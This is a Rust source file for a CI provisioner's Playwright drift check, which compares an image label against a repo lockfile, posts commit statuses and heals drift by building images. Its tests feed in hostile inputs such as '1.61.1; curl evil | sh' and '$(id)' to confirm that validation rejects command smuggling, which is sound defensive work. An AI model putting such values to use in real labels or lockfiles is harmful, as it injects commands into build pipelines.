//! Runner-image dependency-drift detection (ADR-0001).
//!
//! When a runner image bakes a version-locked toolchain dependency — Playwright's
//! browser binaries, baked into `/opt/ms-playwright` at build time — the baked
//! version must match the version the target repo pins in its lockfile. Bump the
//! pin without rebuilding the image and the job fails at runtime with a confusing
//! "executable missing" error that conflates a genuine version mismatch with a
//! transient cache hiccup.
//!
//! faber detects that mismatch at provision time and, by default, only *surfaces*
//! it (a `failure` commit status on the head SHA). Three truths are compared:
//!
//! * **Baked truth** — an image opts in by baking
//!   `LABEL org.faber.playwright.version=<version>`. **No label ⇒ faber does
//!   nothing**: label presence *is* the per-repo opt-in. The one exception is a
//!   *half-wired* opt-in — the repo committed `.faber/config.toml [playwright]`
//!   but its image bakes no label — which faber surfaces once as a diagnostic
//!   (see [`SkipCause::ConfiguredNoLabel`]) instead of silently skipping.
//! * **Pinned truth** — the resolved root `@playwright/test` from the repo's
//!   `package-lock.json`, read at the run's [`WorkflowRun::content_ref`] — **not**
//!   always the head SHA. `actions/checkout`'s default checks out `github.ref`,
//!   which for a `pull_request` run is `refs/pull/<N>/merge` (the PR head
//!   test-merged into the base branch), not the PR branch's own tip commit. A
//!   stale PR branch can pin a different lockfile version at its head than at
//!   that merge tree, and the merge tree is what the job actually runs — reading
//!   the head SHA there measures a tree GitHub never checks out. The commit
//!   status is still posted on the head SHA (that's what the PR page and the
//!   commit itself display); only the *read* follows the merge ref.
//! * **Policy** — faber's global `[playwright_drift]` default, optionally
//!   overridden by the repo's strict [`RepoConfig`] (`.faber/config.toml`), also
//!   read at the content ref.
//!
//! Everything here is **high-confidence-gated**: a `failure` status is posted only
//! when the label is present, the pin parsed, and the versions genuinely differ.
//! Any inspect / fetch / parse failure degrades to an *indeterminate* outcome (a
//! silent audit note) — never a false `failure`. A merge ref that 404s (a
//! conflicting or closed PR GitHub never computed one for) falls back to the head
//! SHA rather than degrading to indeterminate — see [`read_repo_file`].
//!
//! Phase 1 is detection + `surface` only. `gate` (cancel) is recorded in the ADR
//! and still deferred. `auto_pr` (catch-up PR) was **withdrawn** — see the
//! ADR-0001 amendment of 2026-08-28: its coordinates assumed the runner image was
//! built inside the watched repo, and ADR-0008's heal removed the need for it.
//!
//! ADR-0008 adds the response the first three could not give: **heal**. Where the
//! operator has turned on on-demand runner images, a confirmed mismatch is fixed
//! rather than reported — the job is resolved onto a per-version variant of the
//! profile's image, built on the spot if this host doesn't have it yet (see
//! [`heal_playwright_drift`]). Nothing *new* is surfaced when that works — there
//! is no fresh mismatch to report — but a heal under `mode = surface` still posts
//! a `success` status on [`DRIFT_CONTEXT`]. Commit statuses are permanent per
//! `(SHA, context)` until superseded by a later one on the same pair: a `failure`
//! an earlier job surfaced on this SHA (back when nothing healed it yet) would
//! otherwise sit there red forever, lying about a mismatch that no longer exists
//! — which is worse than posting no status at all. When healing doesn't work, the
//! same `mode` surfaces the mismatch exactly as it would have without ADR-0008.

use std::collections::BTreeSet;

use tracing::warn;

use crate::config::{DriftMode, DriftPolicy, RepoConfig, ResolvedPolicy};
use crate::github::{Github, GithubError};
use crate::image::VariantCache;

/// The image label whose value is the baked Playwright version — the opt-in.
pub const DRIFT_LABEL: &str = "org.faber.playwright.version";
/// The commit-status context faber posts drift under.
pub const DRIFT_CONTEXT: &str = "faber/playwright-drift";

/// Why a drift check reached no verdict but that is expected, not an error.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SkipCause {
    /// The image bakes no `org.faber.playwright.version` label — not opted in.
    /// The common, silent case for a generic multi-repo provisioner.
    NoLabel,
    /// The image bakes no label, **but** the repo has explicitly opted in via
    /// `.faber/config.toml [playwright]`. The opt-in is half-wired: the repo half
    /// is present, the image half is missing, so faber can compare nothing and the
    /// repo's "I opted in but nothing happens" is otherwise invisible. Unlike
    /// [`SkipCause::NoLabel`] this is surfaced (once per repo) — see
    /// [`check_playwright_drift`]'s `probe_unlabeled`.
    ConfiguredNoLabel,
    /// The run carried no head SHA to read repo files at.
    NoHeadSha,
    /// The resolved ecosystem isn't npm; other lockfile readers are reserved.
    UnsupportedEcosystem(String),
}

impl SkipCause {
    /// A short reason string for the audit note.
    pub fn reason(&self) -> String {
        match self {
            SkipCause::NoLabel => "image has no org.faber.playwright.version label".to_string(),
            SkipCause::ConfiguredNoLabel => "repo opted in via .faber/config.toml but the runner \
                 image has no org.faber.playwright.version label — rebuild the image to bake it"
                .to_string(),
            SkipCause::NoHeadSha => "run has no head SHA".to_string(),
            SkipCause::UnsupportedEcosystem(e) => format!("unsupported ecosystem {e:?} (npm only)"),
        }
    }
}

/// What faber did about a confirmed mismatch — driven by the resolved mode.
/// Shared between the two directions a status can go: [`act`] raises one on a
/// fresh drift, [`act_healed`] clears one a heal has just made stale.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DriftAction {
    /// `mode = surface`, on a fresh drift: a `failure` commit status was posted.
    Surfaced,
    /// `mode = surface`, on a heal (ADR-0008): a `success` commit status was
    /// posted on the same [`DRIFT_CONTEXT`], superseding any `failure` this SHA
    /// still carried from before the mismatch was healed.
    Cleared,
    /// The status POST itself failed — either direction above. Audited, no false
    /// signal on the commit; the outcome that triggered the post (a surfaced
    /// drift, or a heal that already succeeded) stands regardless.
    StatusError,
    /// `mode = off`: detected but deliberately not surfaced — a fresh drift or a
    /// healed one alike, since a repo on `off` gets no status either way.
    Silent,
    /// `mode = gate`: Phase-2 no-op (no cancel and, being stronger than surface,
    /// no status yet either) — a fresh drift or a healed one alike.
    GateNoop,
}

impl DriftAction {
    /// A short, stable label for the audit log and dashboard.
    pub fn as_str(self) -> &'static str {
        match self {
            DriftAction::Surfaced => "surfaced",
            DriftAction::Cleared => "cleared",
            DriftAction::StatusError => "status_error",
            DriftAction::Silent => "silent",
            DriftAction::GateNoop => "gate_noop",
        }
    }
}

/// The result of one provision-time drift check.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum DriftOutcome {
    /// Not applicable (no opt-in label, no head SHA, or a non-npm ecosystem).
    Skipped(SkipCause),
    /// The baked image version matches the repo's pin. In sync; nothing to do.
    InSync { version: String },
    /// A high-confidence mismatch: label present, pin parsed, versions differ.
    Drift {
        baked: String,
        pinned: String,
        mode: DriftMode,
        action: DriftAction,
    },
    /// A confirmed mismatch faber **healed** by resolving the job onto a
    /// per-version variant of the profile's base image (ADR-0008). Nothing *new*
    /// is surfaced — there is no fresh mismatch to report — but `action` records
    /// whether faber also cleared a stale `failure` this SHA might still be
    /// carrying from before the heal existed (see [`act_healed`]).
    Healed {
        baked: String,
        pinned: String,
        /// The image the job actually runs on.
        image: String,
        /// Whether this job paid for the build or found the variant warm.
        built: bool,
        /// What faber did about a possibly-stale surfaced-failure status.
        action: DriftAction,
    },
    /// A confirmed mismatch faber tried and failed to heal. The job runs on the
    /// base image and the mismatch is surfaced exactly as it would have been
    /// without healing — a variant is an optimisation, and an optimisation must
    /// never turn a job that would have run into one that cannot.
    HealFailed {
        baked: String,
        pinned: String,
        /// Why the variant couldn't be produced.
        cause: String,
        mode: DriftMode,
        action: DriftAction,
    },
    /// Detection couldn't reach a confident verdict (missing lockfile entry, an
    /// inspect / fetch / parse error). Recorded as a silent audit note — never a
    /// `failure` status.
    Indeterminate(String),
}

impl DriftOutcome {
    /// The toolchain versions the image this outcome resolved to actually bakes —
    /// every version a job may pin and still run correctly on that image.
    ///
    /// **Empty means unknown, never "none".** An unlabelled image, an unreadable
    /// lockfile or a repo that never opted in leaves faber with no claim to make
    /// about the image at all, and a caller weighing images against one another
    /// must read that as *no constraint* rather than as an image serving nothing.
    /// Getting that backwards would let a failed read suppress provisioning, which
    /// is the one direction faber must never fail in.
    ///
    /// A **variant bakes two versions**, its base's and its own, because the
    /// browser GC is off in faber's recipe (see [`crate::image::VARIANT_DOCKERFILE`]).
    /// That is not incidental: it is what lets a single image serve a repo's `main`
    /// and its bump PR at the same time, which is the whole reason a pool can stay
    /// homogeneous while two Playwright versions are in flight (ADR-0009).
    pub fn serves(&self) -> BTreeSet<String> {
        match self {
            // Healed: the variant carries the base's baked version *and* the one it
            // was built for.
            DriftOutcome::Healed { baked, pinned, .. } => {
                [baked.clone(), pinned.clone()].into_iter().collect()
            }
            // In sync: the base bakes exactly what the repo pins, and a base image
            // bakes exactly one version.
            DriftOutcome::InSync { version } => [version.clone()].into_iter().collect(),
            // Unhealed drift, or a heal that failed: the job runs on the base, which
            // serves what it bakes and nothing else — notably *not* `pinned`.
            DriftOutcome::Drift { baked, .. } | DriftOutcome::HealFailed { baked, .. } => {
                [baked.clone()].into_iter().collect()
            }
            DriftOutcome::Skipped(_) | DriftOutcome::Indeterminate(_) => BTreeSet::new(),
        }
    }
}

/// The two refs a drift check straddles, bundled into one type so the public
/// entry points below stay under the function-argument lint without dropping
/// either value.
///
/// `head_sha` and `content_ref` diverge for a same-repo `pull_request` run — see
/// [`crate::github::WorkflowRun::content_ref`]. Repo files (the lockfile,
/// `.faber/config.toml`) are read at `content_ref`; a confirmed drift's commit
/// status — surfaced, or later cleared by a heal — is always posted on
/// `head_sha`, unconditionally — that is what the PR page and the commit itself
/// display, and it stays resolvable even when the merge ref later 404s.
#[derive(Debug, Clone, Copy)]
pub struct RunRefs<'a> {
    pub head_sha: &'a str,
    pub content_ref: &'a str,
}

/// Detect Playwright drift for one about-to-be-provisioned Docker job and, per the
/// resolved policy, surface it. Returns a [`DriftOutcome`] the caller records to
/// the audit log and dashboard; this function never blocks or gates provisioning.
///
/// The check short-circuits cheaply for the overwhelming common case — an image
/// with no opt-in label reads a single `docker inspect` and returns
/// [`SkipCause::NoLabel`] without any network I/O.
///
/// `probe_unlabeled` asks for one extra diagnostic on the no-label path: fetch the
/// repo's `.faber/config.toml` and, if it opted in to Playwright drift, return
/// [`SkipCause::ConfiguredNoLabel`] rather than silently skipping — catching the
/// half-wired opt-in. The caller sets it true only *once per repo* (the first job
/// of a daemon lifetime) so this stays a per-repo diagnostic, not a per-job fetch;
/// with it false the no-label path keeps its zero-network-I/O short-circuit.
///
/// See [`RunRefs`] for what `refs` carries and why the two fields inside it are
/// not interchangeable.
pub async fn check_playwright_drift(
    gh: &Github,
    owner_repo: &str,
    refs: RunRefs<'_>,
    image: &str,
    global_policy: &DriftPolicy,
    probe_unlabeled: bool,
) -> DriftOutcome {
    let RunRefs {
        head_sha,
        content_ref,
    } = refs;
    match read_truths(
        gh,
        owner_repo,
        head_sha,
        content_ref,
        image,
        global_policy,
        probe_unlabeled,
    )
    .await
    {
        Truths::Drift {
            baked,
            pinned,
            policy,
        } => {
            let action = act(gh, owner_repo, head_sha, &baked, &pinned, policy.mode).await;
            DriftOutcome::Drift {
                baked,
                pinned,
                mode: policy.mode,
                action,
            }
        }
        settled => settled.into_outcome(),
    }
}

/// Resolve the image one about-to-be-provisioned job should run on, healing a
/// confirmed drift by building a per-version variant of `base` (ADR-0008).
///
/// Returns the image override — `Some` only when a variant was produced — and the
/// outcome to record. Unlike [`check_playwright_drift`] this runs **inline**, on
/// the provisioning path, because its answer decides what container to start; the
/// caller holds the claim parked (never admitted) across it, so a build neither
/// spends the memory budget nor outlives a reclaim.
///
/// Every failure lands on the base image: an unreadable lockfile, a repo that
/// opted out, a build that broke or ran over its cap. The job then behaves
/// exactly as it does today, with the mismatch surfaced by the same `mode` — the
/// status quo this heals, never worse than it.
///
/// See [`RunRefs`] for what `refs` carries and why the two fields inside it are
/// not interchangeable.
pub async fn heal_playwright_drift(
    gh: &Github,
    owner_repo: &str,
    refs: RunRefs<'_>,
    base: &str,
    global_policy: &DriftPolicy,
    cache: &VariantCache,
    probe_unlabeled: bool,
) -> (Option<String>, DriftOutcome) {
    let RunRefs {
        head_sha,
        content_ref,
    } = refs;
    let truths = read_truths(
        gh,
        owner_repo,
        head_sha,
        content_ref,
        base,
        global_policy,
        probe_unlabeled,
    )
    .await;
    let Truths::Drift {
        baked,
        pinned,
        policy,
    } = truths
    else {
        // In sync, not opted in, or nothing confident to say: the base image is
        // already the right answer and there is nothing to build.
        return (None, truths.into_outcome());
    };

    if !policy.heal {
        let action = act(gh, owner_repo, head_sha, &baked, &pinned, policy.mode).await;
        return (
            None,
            DriftOutcome::Drift {
                baked,
                pinned,
                mode: policy.mode,
                action,
            },
        );
    }

    match cache.ensure(base, &pinned).await {
        Ok(variant) => {
            // The heal itself has already succeeded at this point — a variant
            // exists and `image` below is `Some`, so the job runs on it
            // regardless of what happens next. `act_healed` only decides whether
            // to also clear a stale `failure` status; its own failure to post
            // (see [`DriftAction::StatusError`]) must never unwind or downgrade
            // the `Healed` outcome the caller is about to act on.
            let action = act_healed(gh, owner_repo, head_sha, &pinned, policy.mode).await;
            (
                Some(variant.tag.clone()),
                DriftOutcome::Healed {
                    baked,
                    pinned,
                    image: variant.tag,
                    built: variant.built,
                    action,
                },
            )
        }
        Err(e) => {
            let cause = format!("{e:#}");
            // Every queued job pinning the version lands here on every pass while
            // the build stays refused: once per cause, and hourly while it stands.
            if crate::logline::repeats().fresh(
                &format!("variant-build:{owner_repo}:{pinned}"),
                &crate::logline::wording(&cause),
                std::time::Instant::now(),
            ) {
                warn!("{owner_repo}: building a playwright {pinned} runner image failed: {cause}");
            }
            let action = act(gh, owner_repo, head_sha, &baked, &pinned, policy.mode).await;
            (
                None,
                DriftOutcome::HealFailed {
                    baked,
                    pinned,
                    cause,
                    mode: policy.mode,
                    action,
                },
            )
        }
    }
}

/// The three truths of a drift check, read but not yet acted on.
///
/// Split out because two callers need the same reads and must do different things
/// with the one outcome that is actionable: [`check_playwright_drift`] reports it,
/// [`heal_playwright_drift`] tries to make it go away. Every *other* outcome is
/// already final, which is what [`Truths::into_outcome`] says.
enum Truths {
    Skip(SkipCause),
    Indeterminate(String),
    InSync {
        version: String,
    },
    /// A high-confidence mismatch, with the policy resolved for this repo.
    Drift {
        baked: String,
        pinned: String,
        policy: ResolvedPolicy,
    },
}

impl Truths {
    /// The outcome for every settled case. Panics on [`Truths::Drift`], which is
    /// not settled — it is the case both callers exist to handle, so reaching here
    /// with one would be a missing branch, not a runtime condition.
    fn into_outcome(self) -> DriftOutcome {
        match self {
            Truths::Skip(cause) => DriftOutcome::Skipped(cause),
            Truths::Indeterminate(why) => DriftOutcome::Indeterminate(why),
            Truths::InSync { version } => DriftOutcome::InSync { version },
            Truths::Drift { .. } => unreachable!("a drift is acted on, not settled"),
        }
    }
}

/// The baked truth in an image's [`DRIFT_LABEL`], as Docker reported it (#105).
///
/// `Ok(None)` for an image without the label, which has not opted in. `Err`, with
/// the reason, for a label that is not a version. The label is the daemon's to
/// report, and its value is compared, recorded, and written into a commit status,
/// so only a version in the form faber writes one is the baked truth. Anything
/// else decides nothing and posts nothing.
fn baked_truth(label: Option<String>) -> Result<Option<String>, String> {
    match label {
        Some(v) if !crate::untrusted::version(v.trim()) => Err(format!(
            "image label {DRIFT_LABEL} is {:?}, which is not a version",
            crate::untrusted::for_log(&v, 80)
        )),
        label => Ok(label),
    }
}

/// The pinned truth from a repo's lockfile, held to strict semver before anything
/// uses it (#113).
///
/// The lockfile is the repo's to write, at a ref any branch can edit, and what it
/// pins becomes the `PW_VERSION` a variant build hands to `npx` — as well as a tag,
/// a label, a commit status and an audit record. So a value that is not a release
/// version is not a truth at all: the check is indeterminate, nothing is built and
/// nothing is posted. The reason carries the value's length and never the value,
/// because it lands in the log and the dashboard, and the value is exactly what a
/// repo that means harm would choose.
fn pinned_truth(pinned: String) -> Result<String, String> {
    if crate::untrusted::release_version(&pinned) {
        Ok(pinned)
    } else {
        Err(format!(
            "package-lock.json pins @playwright/test at a value that is not a release \
             version ({} bytes) — not building or reporting on it",
            pinned.len()
        ))
    }
}

/// Read the baked label, the resolved policy and the pinned lockfile version, and
/// compare them. Takes no action of any kind — see [`act`].
///
/// `content_ref` is the ref repo files are read at ([`crate::github::WorkflowRun::content_ref`]);
/// `head_sha` is kept alongside it only for [`SkipCause::NoHeadSha`] and to hand
/// [`read_repo_file`] its fallback.
async fn read_truths(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    content_ref: &str,
    image: &str,
    global_policy: &DriftPolicy,
    probe_unlabeled: bool,
) -> Truths {
    // 1. Baked truth: the image label is the opt-in. No label ⇒ do nothing —
    //    except, once per repo, diagnose the half-wired opt-in (repo configured,
    //    image unlabelled) so "I opted in but nothing happens" is visible.
    let baked = match baked_truth(crate::docker::inspect_label(image, DRIFT_LABEL).await) {
        Err(why) => return Truths::Indeterminate(why),
        Ok(Some(v)) => v,
        Ok(None) => {
            return Truths::Skip(
                no_label_cause(gh, owner_repo, head_sha, content_ref, probe_unlabeled).await,
            )
        }
    };
    if head_sha.is_empty() {
        return Truths::Skip(SkipCause::NoHeadSha);
    }

    // 2. Policy: the global default, optionally overridden by the repo's strict
    //    .faber/config.toml at the content ref (repo-wins). A missing or malformed
    //    override degrades to the global default — never a hard failure.
    let repo_cfg = fetch_repo_config(gh, owner_repo, head_sha, content_ref).await;
    let policy = RepoConfig::resolve(global_policy, repo_cfg.as_ref());

    // 3. Ecosystem: npm (package-lock.json) is the only reader wired in Phase 1.
    if policy.ecosystem != "npm" {
        return Truths::Skip(SkipCause::UnsupportedEcosystem(policy.ecosystem));
    }

    // 4. Pinned truth: the resolved root @playwright/test from package-lock.json,
    //    read at the tree the job actually checks out — falling back to the head
    //    SHA if that specific ref can't be read (see `read_repo_file`).
    let pinned =
        match read_repo_file(gh, owner_repo, "package-lock.json", content_ref, head_sha).await {
            Ok(Some(bytes)) => match pinned_from_npm_lock(&bytes).map(pinned_truth) {
                Some(Ok(v)) => v,
                Some(Err(why)) => return Truths::Indeterminate(why),
                None => {
                    return Truths::Indeterminate(
                        "package-lock.json has no resolved @playwright/test".to_string(),
                    )
                }
            },
            Ok(None) => {
                return Truths::Indeterminate(
                    "no package-lock.json at content ref or head SHA".to_string(),
                )
            }
            Err(e) => return Truths::Indeterminate(format!("reading package-lock.json: {e}")),
        };

    // 5. Compare. High confidence: both versions known and genuinely different.
    if versions_match(&baked, &pinned) {
        return Truths::InSync {
            version: baked.trim().to_string(),
        };
    }
    Truths::Drift {
        baked: baked.trim().to_string(),
        pinned: pinned.trim().to_string(),
        policy,
    }
}

/// Act on a confirmed mismatch per the resolved mode.
async fn act(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    baked: &str,
    pinned: &str,
    mode: DriftMode,
) -> DriftAction {
    match mode {
        DriftMode::Off => DriftAction::Silent,
        DriftMode::Surface => surface(gh, owner_repo, head_sha, baked, pinned).await,
        // Phase-2 no-op: gate will cancel the run; until then, detect + record only.
        DriftMode::Gate => DriftAction::GateNoop,
    }
}

/// The no-opt-in-label outcome. Cheap by default ([`SkipCause::NoLabel`], zero
/// network I/O). When `probe` is set — once per repo, see
/// [`check_playwright_drift`] — it fetches `.faber/config.toml`: a repo that opted
/// in to Playwright drift yet ships an unlabelled image is a *half-wired* opt-in,
/// surfaced as [`SkipCause::ConfiguredNoLabel`]. A repo with no such config, no
/// head SHA, or an unreadable config degrades to the silent common case.
async fn no_label_cause(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    content_ref: &str,
    probe: bool,
) -> SkipCause {
    if probe && !head_sha.is_empty() {
        if let Some(cfg) = fetch_repo_config(gh, owner_repo, head_sha, content_ref).await {
            if cfg.playwright.is_some() {
                return SkipCause::ConfiguredNoLabel;
            }
        }
    }
    SkipCause::NoLabel
}

/// Fetch and parse the repo's `.faber/config.toml` at `content_ref` (falling back
/// to `head_sha`, see [`read_repo_file`]). `None` when the repo commits no such
/// file, or when it is unreadable / malformed — the caller then falls back to the
/// global policy (a broken override must not weaken or break detection). Read at
/// the same ref the job's own code runs from regardless, so reading its drift
/// policy there is strictly less privileged (and the schema can't express
/// anything but drift knobs).
async fn fetch_repo_config(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    content_ref: &str,
) -> Option<RepoConfig> {
    match read_repo_file(gh, owner_repo, ".faber/config.toml", content_ref, head_sha).await {
        Ok(Some(bytes)) => match std::str::from_utf8(&bytes) {
            Ok(text) => match toml::from_str::<RepoConfig>(text) {
                Ok(cfg) => Some(cfg),
                Err(e) => {
                    warn!("{owner_repo}: .faber/config.toml is invalid ({e}); using global policy");
                    None
                }
            },
            Err(_) => {
                warn!("{owner_repo}: .faber/config.toml is not UTF-8; using global policy");
                None
            }
        },
        Ok(None) => None,
        Err(e) => {
            warn!("{owner_repo}: fetching .faber/config.toml failed ({e}); using global policy");
            None
        }
    }
}

/// Read one repo file, preferring `content_ref` — the tree the job's own
/// `actions/checkout` will run — and falling back to `head_sha` when `content_ref`
/// specifically 404s.
///
/// [`crate::github::WorkflowRun::content_ref`] only ever differs from `head_sha`
/// for a same-repo `pull_request` run, where it names a PR merge ref
/// (`refs/pull/<N>/merge`) GitHub computes lazily and can lack: a closed PR, one
/// with a real merge conflict, or one GitHub simply hasn't recomputed yet — all
/// 404. None of those can run meaningful CI regardless, so degrading straight to
/// [`Truths::Indeterminate`] over an artifact of PR mergeability would be a false
/// negative on drift the head commit's own tree might still show — reading
/// `head_sha` instead is strictly more informative, never less.
///
/// The equality short-circuit is what keeps a non-PR run (where `content_ref` is
/// already `head_sha`) down to the one API call it made before this existed —
/// [`check_playwright_drift`]'s contract against an extra round-trip on the
/// common path.
async fn read_repo_file(
    gh: &Github,
    owner_repo: &str,
    path: &str,
    content_ref: &str,
    head_sha: &str,
) -> Result<Option<Vec<u8>>, GithubError> {
    if content_ref == head_sha {
        return gh.get_file_at_ref(owner_repo, path, head_sha).await;
    }
    match gh.get_file_at_ref(owner_repo, path, content_ref).await {
        Ok(None) => gh.get_file_at_ref(owner_repo, path, head_sha).await,
        other => other,
    }
}

/// Post the surface-mode `failure` commit status. A failure to post is itself
/// downgraded (audited as [`DriftAction::StatusError`]), never surfaced as a
/// bogus status.
async fn surface(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    baked: &str,
    pinned: &str,
) -> DriftAction {
    let description = format!(
        "Runner image bakes Playwright {} but the repo pins {} — rebuild the runner image",
        baked.trim(),
        pinned.trim(),
    );
    match gh
        .post_commit_status(
            owner_repo,
            head_sha,
            "failure",
            DRIFT_CONTEXT,
            Some(&description),
            "drift: the runner image and the repo's lockfile disagree (ADR-0001)",
        )
        .await
    {
        Ok(()) => DriftAction::Surfaced,
        Err(e) => {
            warn!("{owner_repo}: posting drift commit status failed: {e}");
            DriftAction::StatusError
        }
    }
}

/// Whether a heal posts the clearing status, gated on the same resolved `mode`
/// [`act`] uses for a fresh drift — mirrored rather than shared, because the two
/// mean opposite things at the same mode:
///
/// * `off` — the repo asked faber to stay off its commits entirely. A fresh
///   drift under `off` is already [`DriftAction::Silent`], so there was never a
///   `failure` posted for this heal to supersede, and posting a bare `success`
///   out of nowhere would be a status the repo never asked for.
/// * `gate` — Phase-2's cancel path posts no status yet in *either* direction
///   (see [`act`]); a heal under `gate` has nothing to clear for the same reason
///   a drift under `gate` has nothing to raise.
/// * `surface` is the only mode that can have a stale `failure` sitting on this
///   SHA — from a job that surfaced the drift before this one healed it — so it
///   is the only mode that clears it.
async fn act_healed(
    gh: &Github,
    owner_repo: &str,
    head_sha: &str,
    pinned: &str,
    mode: DriftMode,
) -> DriftAction {
    match mode {
        DriftMode::Off => DriftAction::Silent,
        DriftMode::Surface => clear(gh, owner_repo, head_sha, pinned).await,
        DriftMode::Gate => DriftAction::GateNoop,
    }
}

/// The description for the heal-mode `success` status. Pulled out of [`clear`]
/// so its wording and length are unit-testable without a live `Github` client.
fn heal_description(pinned: &str) -> String {
    format!(
        "healed onto a runner image with Playwright {}",
        pinned.trim()
    )
}

/// Post the heal-mode `success` commit status on [`DRIFT_CONTEXT`]. Commit
/// statuses are permanent per `(SHA, context)` until superseded by a later post
/// on the same pair (see the module doc) — this is what turns a stale `failure`
/// an earlier job surfaced on this SHA back to green now that the mismatch is
/// healed. A failure to post degrades exactly like [`surface`]'s does: audited as
/// [`DriftAction::StatusError`], never a hard error — and, critically, never
/// something the caller lets undo or downgrade the `Healed` outcome, because the
/// heal itself already succeeded by the time this runs.
async fn clear(gh: &Github, owner_repo: &str, head_sha: &str, pinned: &str) -> DriftAction {
    let description = heal_description(pinned);
    match gh
        .post_commit_status(
            owner_repo,
            head_sha,
            "success",
            DRIFT_CONTEXT,
            Some(&description),
            "drift: healed, clearing the failure an earlier job posted (ADR-0001)",
        )
        .await
    {
        Ok(()) => DriftAction::Cleared,
        Err(e) => {
            warn!("{owner_repo}: posting drift-clear commit status failed: {e}");
            DriftAction::StatusError
        }
    }
}

/// Read the *resolved* root `@playwright/test` version from an npm `package-lock`
/// (`lockfileVersion` 2/3): `.packages["node_modules/@playwright/test"].version`.
/// Resolved, not declared, because it is exactly what the job installs and the
/// runtime resolves the baked browsers against. `None` on any shape faber can't
/// read confidently (a v1 lockfile with no `packages`, a missing entry, non-JSON).
fn pinned_from_npm_lock(bytes: &[u8]) -> Option<String> {
    let root: serde_json::Value = serde_json::from_slice(bytes).ok()?;
    let version = root
        .get("packages")?
        .get("node_modules/@playwright/test")?
        .get("version")?
        .as_str()?
        .trim();
    (!version.is_empty()).then(|| version.to_string())
}

/// Whether the baked and pinned versions are the same (whitespace-insensitive).
/// Both come from exact sources — an asserted build-arg label and a lockfile's
/// *resolved* version — so an exact string compare is the honest test; no semver
/// range logic that could mask or invent a mismatch.
fn versions_match(baked: &str, pinned: &str) -> bool {
    baked.trim() == pinned.trim()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// #105: the drift label is the daemon's to report, and what it holds is
    /// compared, recorded and written into a commit status. Only a version is a
    /// baked truth; anything else is a check that decides nothing.
    #[test]
    fn a_drift_label_that_is_not_a_version_is_no_baked_truth() {
        assert_eq!(
            baked_truth(Some("1.61.1".to_string())),
            Ok(Some("1.61.1".to_string()))
        );
        assert_eq!(baked_truth(None), Ok(None), "no label: not opted in");
        for bad in [
            "1.61.1; curl evil | sh",
            "$(id)",
            "1.61.1\nforged",
            "-1.61.1",
            "v1.61.1 (latest)",
        ] {
            let why = baked_truth(Some(bad.to_string())).expect_err(bad);
            assert!(why.contains("not a version"), "{why}");
        }
    }

    /// A minimal but shape-accurate `lockfileVersion: 3` payload: the root pin
    /// lives under `packages["node_modules/@playwright/test"].version`.
    const LOCK_V3: &str = r#"{
        "name": "app",
        "lockfileVersion": 3,
        "packages": {
            "": { "name": "app", "dependencies": {} },
            "node_modules/@playwright/test": {
                "version": "1.59.1",
                "resolved": "https://registry.npmjs.org/@playwright/test/-/test-1.59.1.tgz"
            },
            "node_modules/playwright": { "version": "1.59.1" }
        }
    }"#;

    /// #113: a lockfile's pin becomes `${PW_VERSION}` after `playwright@` in an
    /// `npx` call. Only a release version is a pinned truth, and the reason a
    /// refused one gives names its length, never the value.
    #[test]
    fn a_lockfile_pin_that_is_not_a_release_version_is_no_pinned_truth() {
        assert_eq!(pinned_truth("1.59.1".into()), Ok("1.59.1".into()));
        assert_eq!(
            pinned_truth("1.50.0-alpha-2024-11-25".into()),
            Ok("1.50.0-alpha-2024-11-25".into())
        );
        let lock = LOCK_V3.replace(r#""version": "1.59.1","#, r#""version": "npm:evil@1.0.0","#);
        let pinned = pinned_from_npm_lock(lock.as_bytes()).expect("the lockfile still reads");
        let why = pinned_truth(pinned).expect_err("a package spec is not a version");
        assert!(why.contains("14 bytes"), "{why}");
        assert!(
            !why.contains("evil"),
            "the value itself is never echoed: {why}"
        );
        for bad in ["github:owner/demo", "https://example.com/x.tgz", "^1.59.1"] {
            assert!(pinned_truth(bad.into()).is_err(), "{bad}");
        }
    }

    /// A served set, spelled out, for the [`DriftOutcome::serves`] cases.
    fn versions(vs: &[&str]) -> BTreeSet<String> {
        vs.iter().map(|v| v.to_string()).collect()
    }

    #[test]
    fn an_outcome_reports_what_its_image_bakes_not_what_the_repo_wanted() {
        // A heal produces an image that bakes *two* versions — the base's and the one it
        // was built for — which is what lets a single image serve a repo's `main`
        // and its bump PR at once (ADR-0009 leans on this).
        assert_eq!(
            DriftOutcome::Healed {
                baked: "1.61.1".to_string(),
                pinned: "1.62.1".to_string(),
                image: "faber-runner:abc-pw-1.62.1".to_string(),
                built: true,
                action: DriftAction::Silent,
            }
            .serves(),
            versions(&["1.61.1", "1.62.1"])
        );
        // The trap: an *unhealed* drift runs on the base, so the pinned version is
        // precisely what the image cannot serve. Reporting it here would tell a
        // caller the pool is fine when the mismatch is exactly why it isn't.
        assert_eq!(
            DriftOutcome::Drift {
                baked: "1.61.1".to_string(),
                pinned: "1.62.1".to_string(),
                mode: DriftMode::Surface,
                action: DriftAction::Silent,
            }
            .serves(),
            versions(&["1.61.1"])
        );
        assert_eq!(
            DriftOutcome::InSync {
                version: "1.61.1".to_string()
            }
            .serves(),
            versions(&["1.61.1"])
        );
        // Unknown, and it must read as unknown — empty is "faber cannot say", which
        // callers turn into *no constraint*, never into "this image serves nothing".
        assert!(DriftOutcome::Skipped(SkipCause::NoLabel)
            .serves()
            .is_empty());
        assert!(DriftOutcome::Indeterminate("no lockfile".to_string())
            .serves()
            .is_empty());
    }

    #[test]
    fn reads_resolved_playwright_from_npm_lock() {
        assert_eq!(
            pinned_from_npm_lock(LOCK_V3.as_bytes()).as_deref(),
            Some("1.59.1")
        );
    }

    #[test]
    fn missing_playwright_entry_is_none() {
        let lock = r#"{ "lockfileVersion": 3, "packages": { "": {} } }"#;
        assert_eq!(pinned_from_npm_lock(lock.as_bytes()), None);
    }

    #[test]
    fn v1_lockfile_without_packages_is_none() {
        // A legacy `lockfileVersion: 1` file has `dependencies`, not `packages`;
        // faber can't read it confidently, so it degrades rather than guesses.
        let lock = r#"{
            "lockfileVersion": 1,
            "dependencies": { "@playwright/test": { "version": "1.59.1" } }
        }"#;
